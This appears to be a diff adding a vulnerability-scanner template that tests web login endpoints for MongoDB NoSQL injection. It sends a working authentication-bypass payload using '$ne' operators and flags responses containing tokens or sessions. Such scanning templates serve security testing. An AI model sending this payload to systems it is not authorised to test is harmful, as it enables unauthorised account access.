@@ -1,0 +1,34 @@
+id: whai-nosqli-mongodb
+
+info:
+  name: NoSQL Injection (MongoDB)
+  author: whitehat-ai
+  severity: critical
+  description: Tests for MongoDB NoSQL injection through JSON operators
+  tags: nosqli,mongodb,injection,critical
+  classification:
+    cwe-id: CWE-943
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/api/auth"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"username":{"$ne":""},"password":{"$ne":""}}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"token"'
+          - '"session"'
+          - '"success":true'
+        condition: or
